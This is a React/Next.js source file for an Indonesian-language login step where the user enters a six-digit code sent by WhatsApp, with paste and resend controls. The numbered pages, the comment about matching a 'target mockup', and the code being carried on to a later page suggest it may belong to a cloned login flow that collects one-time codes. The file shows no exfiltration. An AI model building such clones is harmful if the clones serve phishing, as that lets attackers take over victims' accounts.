"use client";

import React, { useState } from "react";
import Link from "next/link";
import { useRouter } from "next/navigation";
import { ArrowLeft, Lock } from "lucide-react";
import { useApp } from "../../lib/AppContext";

/**
 * Verification Code Page (page4) - Highly accurate version based on target mockup.
 */
export default function Page4() {
  const router = useRouter();
  const { appData, updateAppData } = useApp();
  const code = appData.otp || "";
  const [timeLeft, setTimeLeft] = React.useState(60);

  React.useEffect(() => {
    if (code.length === 6) {
      const timer = setTimeout(() => {
        router.push("/page5");
      }, 600);
      return () => clearTimeout(timer);
    }
  }, [code, router]);

  React.useEffect(() => {
    if (timeLeft <= 0) return;
    const timer = setInterval(() => {
      setTimeLeft((prev) => prev - 1);
    }, 1000);
    return () => clearInterval(timer);
  }, [timeLeft]);

  const formatTime = (seconds: number) => {
    const s = seconds % 60;
    return `00:${s.toString().padStart(2, "0")}`;
  };

  const inputRef = React.useRef<HTMLInputElement>(null);

  const handlePaste = async (e: React.MouseEvent) => {
    e.stopPropagation();
    
    // Check if we are in a secure context or localhost
    if (navigator.clipboard && navigator.clipboard.readText) {
      try {
        const text = await navigator.clipboard.readText();
        const cleaned = text.replace(/[^0-9]/g, "").slice(0, 6);
        if (cleaned) updateAppData({ otp: cleaned });
      } catch (err) {
        // Fallback to focus if API denied
        inputRef.current?.focus();
      }
    } else {
      // Non-secure context (Local IP) fallback:
      // Focus the input to let the native mobile paste menu appear
      inputRef.current?.focus();
    }
  };

  const handleInput = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/[^0-9]/g, "").slice(0, 6);
    updateAppData({ otp: val });
  };

  return (
    <div className="relative min-h-screen w-full bg-[#FFB800] flex flex-col font-sans text-black overflow-hidden selection:bg-white/30">
      
      {/* Top Navigation */}
      <header className="w-full px-6 py-8 flex items-center justify-between z-10">
        <Link href="/page3" className="flex items-center gap-2 group">
          <ArrowLeft className="w-6 h-6" />
          <span className="text-xl font-bold">Log In</span>
        </Link>
        
        {/* Right Icon - Black Circle with Stripes (as seen in mock) */}
        <div className="w-10 h-10 bg-zinc-900 rounded-full flex flex-col items-center justify-center gap-1 overflow-hidden p-1 shadow-md">
           <div className="w-8 h-[2px] bg-white/20" />
           <div className="w-8 h-[2px] bg-white/20" />
           <div className="w-8 h-[2px] bg-white/20" />
           <div className="w-8 h-[2px] bg-white/20" />
        </div>
      </header>

      {/* Main Content */}
      <main className="px-4 flex-1 flex flex-col">
        {/* Headline Section */}
        <div className="mt-4 mb-8">
          <h1 className="text-[36px] font-black mb-4 tracking-tight leading-tight">Halo!</h1>
          <p className="text-black text-lg leading-snug font-medium max-w-[300px]">
            Masukkan kode yang telah kami kirim lewat <span className="font-bold">WhatsApp</span> ke <span className="font-bold">+6285****164</span>
          </p>
        </div>

        {/* Verification Form Area */}
        <div className="mt-8 w-full">
          <div className="flex items-center gap-2.5 mb-6 opacity-60">
            <Lock className="w-4 h-4" />
            <span className="text-sm font-bold">Kode verifikasi</span>
          </div>

          {/* Input Row */}
          <div className="relative flex items-center gap-3 w-full h-[60px]">
            {/* Pks Box - Compact White Background */}
            <div className="bg-white/20 backdrop-blur-sm shadow-sm p-2 rounded-xl flex items-center justify-center border border-white/10 shrink-0">
              <span className="text-xl font-black">Pks</span>
            </div>
            
            {/* Dashes Area - Increased visibility and spacing for mobile */}
            <div className="relative flex-1 flex items-center justify-around px-0.5">
              {[0, 1, 2, 3, 4, 5].map((i) => (
                <div key={i} className="flex flex-col items-center gap-1.5 min-w-[12px]">
                  <span className="text-xl font-bold h-7 flex items-center text-black">
                    {code[i] || ""}
                  </span>
                  <div className={`h-[2px] w-4 sm:w-6 rounded-full ${code[i] ? 'bg-white' : 'bg-white/60'}`} />
                </div>
              ))}
              {/* Hidden actual input covering only the dashes area */}
              <input 
                ref={inputRef}
                type="tel"
                className="absolute inset-0 opacity-0 cursor-pointer z-10"
                value={code}
                onChange={handleInput}
                autoFocus
              />
            </div>

            {/* Paste Button (Rounded Rectangle style) */}
            <button 
              onClick={handlePaste}
              className="relative z-20 bg-white p-2 rounded-xl font-black text-xs shadow-md active:scale-95 transition-transform flex items-center justify-center shrink-0"
            >
              TEMPEL
            </button>
          </div>
        </div>

        {/* Resend Loader Area */}
        <button 
          disabled={timeLeft > 0}
          onClick={() => timeLeft === 0 && setTimeLeft(60)}
          className={`mt-12 flex items-center justify-center gap-4 transition-all ${timeLeft > 0 ? 'cursor-default' : 'hover:scale-105 active:scale-95 cursor-pointer'}`}
        >
          {timeLeft > 0 && <div className="w-8 h-8 rounded-full border-[3px] border-black/10 border-t-black animate-spin" />}
          <span className={`${timeLeft > 0 ? 'text-white' : 'text-black underline'} font-bold text-sm tracking-wide`}>
            {timeLeft > 0 ? `Kirim ulang dalam ${formatTime(timeLeft)}` : 'Kirim Ulang Sekarang'}
          </span>
        </button>
      </main>

      {/* Home Indicator Mockup */}
      <div className="bg-black w-32 h-1.5 rounded-full mx-auto mb-2 opacity-10 mt-auto" />
    </div>
  );
}
